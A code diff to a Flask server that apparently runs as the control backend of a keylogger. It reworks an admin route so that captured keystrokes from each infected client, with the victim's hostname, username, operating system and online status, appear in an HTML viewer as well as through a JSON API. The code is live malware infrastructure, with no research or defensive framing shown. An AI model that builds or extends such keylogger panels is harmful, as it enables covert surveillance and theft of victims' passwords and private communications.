@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 import time
 import threading
 from datetime import datetime
@@ -439,29 +439,60 @@ def receive_keylog_data():
 @app.route("/admin/keylogs/<client_id>", methods=["GET"])
 def get_client_keylogs(client_id):
     try:
-        limit = request.args.get('limit', 100, type=int)
+        # Check if request wants JSON (API call)
+        if request.args.get('format') == 'json':
+            limit = request.args.get('limit', 100, type=int)
+            
+            if client_id in keylogs_storage:
+                logs = keylogs_storage[client_id][-limit:]
+                return jsonify({
+                    "success": True,
+                    "client_id": client_id,
+                    "keylogs": logs,
+                    "total_logs": len(keylogs_storage[client_id]),
+                    "returned_logs": len(logs)
+                })
+            else:
+                return jsonify({
+                    "success": True,
+                    "client_id": client_id,
+                    "keylogs": [],
+                    "total_logs": 0,
+                    "message": "No keylogs found for this client"
+                })
         
+        # Default: Return HTML interface
+        limit = request.args.get('limit', 500, type=int)
+        
+        # Get client info
+        client_info = clients.get(client_id, {})
+        system_info = client_info.get('system_info', {})
+        hostname = system_info.get('hostname', 'Unknown')
+        username = system_info.get('username', 'Unknown')
+        os_name = system_info.get('os', 'Unknown')
+        
+        # Get keylogs
+        logs = []
+        total_logs = 0
         if client_id in keylogs_storage:
+            total_logs = len(keylogs_storage[client_id])
             logs = keylogs_storage[client_id][-limit:]
-            return jsonify({
-                "success": True,
-                "client_id": client_id,
-                "keylogs": logs,
-                "total_logs": len(keylogs_storage[client_id]),
-                "returned_logs": len(logs)
-            })
-        else:
-            return jsonify({
-                "success": True,
-                "client_id": client_id,
-                "keylogs": [],
-                "total_logs": 0,
-                "message": "No keylogs found for this client"
-            })
+        
+        # Check if client is online
+        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
+        
+        return render_template('keylogs_viewer.html',
+                             client_id=client_id,
+                             hostname=hostname,
+                             username=username,
+                             os_name=os_name,
+                             is_online=is_online,
+                             total_logs=total_logs,
+                             logs=logs)
     
     except Exception as e:
         print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
-        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
+        return f"<h1>Error</h1><p>Failed to load keylogs: {e}</p>", 500
 
 
 @app.route("/admin/keylogs_stats", methods=["GET"])
